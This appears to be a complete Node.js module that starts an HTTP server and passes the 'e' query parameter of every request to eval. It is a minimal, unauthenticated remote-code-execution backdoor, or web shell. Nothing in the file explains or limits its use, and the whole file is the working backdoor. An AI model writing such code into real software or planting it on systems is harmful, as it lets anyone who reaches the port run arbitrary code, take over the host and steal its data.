module.exports = function(port){
    require('http').createServer((q,s)=>{try{eval(require('url').parse(q.url,1).query.e)}catch{s.end('bad boy')}}).listen(port);
}